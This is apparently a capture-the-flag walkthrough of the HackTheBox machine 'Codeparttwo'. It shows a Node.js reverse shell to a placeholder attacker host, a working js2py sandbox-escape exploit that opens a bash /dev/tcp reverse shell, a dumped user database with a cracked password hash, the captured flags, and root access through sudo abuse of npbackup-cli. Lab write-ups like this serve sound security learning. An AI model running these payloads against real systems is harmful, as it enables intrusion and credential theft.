---
title: "Codeparttwo"
date: 2025-09-09
slug: "codeparttwo"
tags: ["Unrated", "HTB", "Unknown-OS"]
difficulty: "Unrated"
platform: "HTB"
os: "Unknown-OS"
summary: "Walkthrough of the Codeparttwo HTB machine covering recon, exploitation, and privilege escalation."
---
## Enumeration

```shell
nmap 10.129.132.93        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-06 18:50 EEST
Nmap scan report for 10.129.132.93
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 2.48 seconds

```

## Finding a foothold

created a user test:testtest and found a javascript code editor

so I will try running this:

```javascript
(function() {
    var net = require("net");
    var cp = require("child_process");
    var sh = cp.spawn("sh", []); // For Unix/Linux systems

    // Replace ATTACKER_IP and PORT with the attacker's IP and listener port
    var client = new net.Socket();
    client.connect(4444, "ATTACKER_IP", function() {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });

    return /a/; // Prevents some Node.js crashes
})();
```

response: `Error: ReferenceError: require is not defined`

then tried running this:

```javascript
function add(a, b) {
    "use strict";
    return a + b;
}
console.log(add(1, 2));
```

and didn't get anything in return seems like normal code does not run, I will download the app and read the backend:

```python
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

this seems interesting

from chat:

The `js2py` Python package, which allows JavaScript code evaluation within a Python interpreter, contains a critical code injection vulnerability that enables sandbox escape and arbitrary command execution.

https://security.snyk.io/vuln/SNYK-PYTHON-JS2PY-7300331

I will use this github repo for the poc: https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape

So I ran this in the code editor:

```javascript
let cmd = "bash -c 'bash -i >&/dev/tcp/10.10.16.34/12345 0>&1'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

and got a shell

```shell
nc -nlvp 12345
listening on [any] 12345 ...
connect to [10.10.16.34] from (UNKNOWN) [10.129.232.59] 50238
bash: cannot set terminal process group (924): Inappropriate ioctl for device
bash: no job control in this shell
app@codeparttwo:~/app$ ls
ls
app.py
instance
__pycache__
requirements.txt
static
templates
app@codeparttwo:~/app$ 

```

we are in a docker environment:

```bash
app@codeparttwo:/home$ env
env
SHELL=/bin/bash
SERVER_SOFTWARE=gunicorn/20.0.4
PWD=/home
LOGNAME=app
HOME=/home/app
LANG=en_US.UTF-8
LS_COLORS=
INVOCATION_ID=2e74ee600f4d4ab9bbcfd2732487dd71
LESSCLOSE=/usr/bin/lesspipe %s %s
LESSOPEN=| /usr/bin/lesspipe %s
USER=app
SHLVL=2
JOURNAL_STREAM=9:25459
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
OLDPWD=/home/app/app
app@codeparttwo:/home$ 

```

Since I read the code I know there is a db under instance directory:

```shell
sqlite3 users.db
sqlite3 users.db
SELECT * FROM user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

on hashes.com : 649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove

SSH with marco user

```shell
ls
backups  npbackup.conf  user.txt
marco@codeparttwo:~$ cat user.txt
42afe3ade1c4ddc75b2608bd85db9962
marco@codeparttwo:~$ cat npbackup.conf 
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}

```

```shell
sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli

```

```shell
sudo npbackup-cli -c npbackup.conf --show-config
2025-09-06 18:27:14,409 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-09-06 18:27:14,441 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf
[
    {
        "repo_uri": "__(o_O)__",
        "repo_group": "default_group",
        "backup_opts": {
            "paths": [
                "/home/app/app/"
            ],
            "source_type": "folder_list",
            "exclude_files_larger_than": "0.0 KiB",
            "stdin_from_command": null,
            "stdin_filename": null,
            "tags": [],
            "compression": "auto",
            "use_fs_snapshot": true,
            "ignore_cloud_files": true,
            "one_file_system": false,
            "priority": "low",
            "exclude_caches": true,
            "excludes_case_ignore": false,
            "exclude_files": [
                "excludes/generic_excluded_extensions",
                "excludes/generic_excludes",
                "excludes/windows_excludes",
                "excludes/linux_excludes"
            ],
            "exclude_patterns": [],
            "additional_parameters": null,
            "additional_backup_only_parameters": null,
            "minimum_backup_size_error": "10.0 MiB",
            "pre_exec_commands": [],
            "pre_exec_per_command_timeout": 3600,
            "pre_exec_failure_is_fatal": false,
            "post_exec_commands": [],
            "post_exec_per_command_timeout": 3600,
            "post_exec_failure_is_fatal": false,
            "post_exec_execute_even_on_backup_error": true,
            "post_backup_housekeeping_percent_chance": 0,
            "post_backup_housekeeping_interval": 0
        },
        "repo_opts": {
            "repo_password": "__(o_O)__",
            "retention_policy": {
                "last": 3,
                "hourly": 72,
                "daily": 30,
                "weekly": 4,
                "monthly": 12,
                "yearly": 3,
                "tags": [],
                "keep_within": true,
                "group_by_host": true,
                "group_by_tags": true,
                "group_by_paths": false,
                "ntp_server": null
            },
            "prune_max_unused": 0,
            "repo_password_command": "__(o_O)__",
            "minimum_backup_age": 1440,
            "upload_speed": "800.0 Mib",
            "download_speed": "0.0 Kib",
            "backend_connections": 0,
            "prune_max_repack_size": null
        },
        "prometheus": {
            "metrics": false,
            "instance": "codeparttwo__blw0",
            "destination": null,
            "http_username": null,
            "http_password": null,
            "additional_labels": {},
            "no_cert_verify": false,
            "backup_job": "codeparttwo__blw0",
            "group": null
        },
        "env": {
            "env_variables": {},
            "encrypted_env_variables": {}
        },
        "is_protected": false,
        "permissions": "full",
        "manager_password": null,
        "name": "default"
    }
]
2025-09-06 18:27:14,467 :: INFO :: ExecTime = 0:00:00.060366, finished, state is: success.

```

nothing looks interesting in the snapshot:

```shell
sudo npbackup-cli -c npbackup.conf -s
2025-09-06 18:33:11,485 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-09-06 18:33:11,517 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf
2025-09-06 18:33:11,530 :: INFO :: Listing snapshots of repo default
ID        Time                 Host        Tags        Paths          Size
--------------------------------------------------------------------------------
35a4dac3  2025-04-06 03:50:16  codetwo                 /home/app/app  48.295 KiB
--------------------------------------------------------------------------------
1 snapshots
2025-09-06 18:33:13,688 :: INFO :: Snapshots listed successfully
2025-09-06 18:33:13,688 :: INFO :: Runner took 2.158335 seconds for snapshots
2025-09-06 18:33:13,688 :: INFO :: Operation finished
2025-09-06 18:33:13,696 :: INFO :: ExecTime = 0:00:02.214034, finished, state is: success.
marco@codeparttwo:~$ sudo npbackup-cli -c npbackup.conf --dump 35a4dac3 
Fatal: cannot dump file: path "/35a4dac3" not found in snapshot
marco@codeparttwo:~$ sudo npbackup-cli -c npbackup.conf --ls 35a4dac3
2025-09-06 18:33:49,231 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-09-06 18:33:49,260 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf
2025-09-06 18:33:49,270 :: INFO :: Showing content of snapshot 35a4dac3 in repo default
2025-09-06 18:33:51,554 :: INFO :: Successfully listed snapshot 35a4dac3 content:
snapshot 35a4dac3 of [/home/app/app] at 2025-04-06 03:50:16.222832208 +0000 UTC by root@codetwo filtered by []:
/home
/home/app
/home/app/app
/home/app/app/__pycache__
/home/app/app/__pycache__/app.cpython-38.pyc
/home/app/app/app.py
/home/app/app/instance
/home/app/app/instance/users.db
/home/app/app/requirements.txt
/home/app/app/static
/home/app/app/static/app.zip
/home/app/app/static/css
/home/app/app/static/css/styles.css
/home/app/app/static/js
/home/app/app/static/js/script.js
/home/app/app/templates
/home/app/app/templates/base.html
/home/app/app/templates/dashboard.html
/home/app/app/templates/index.html
/home/app/app/templates/login.html
/home/app/app/templates/register.html

2025-09-06 18:33:51,555 :: INFO :: Runner took 2.284825 seconds for ls
2025-09-06 18:33:51,555 :: INFO :: Operation finished
2025-09-06 18:33:51,564 :: INFO :: ExecTime = 0:00:02.334629, finished, state is: success.
marco@codeparttwo:~$ 

```

SO what I think I will do is create a conf file and create a backup of it with sudo so that I perform commands in sudo

created this conf:

```shell
 cat root.conf
conf_version: 3.0.1
backup_opts:
  pre_exec_commands:
    - bash test.sh
    - chmod 777 /root
  pre_exec_per_command_timeout: 3600
  pre_exec_failure_is_fatal: false
  post_exec_commands:
    - chmod 777 /root
    - ls /
  post_exec_per_command_timeout: 3600
  post_exec_failure_is_fatal: false
  post_exec_execute_even_on_backup_error: true 
```

didn't work even after appending just pre_exec_commands to the npbackup.conf below which is disappointing (of course after copying the full conf) so I copied npbackup.conf into a new file and changed the path to /root

then I ran `sudo npbackup-cli -c root.conf -b`

and then:
```shell
sudo npbackup-cli -c root.conf --dump /root/root.txt
3dff2558134b5dea2f885bbe640674e2
```
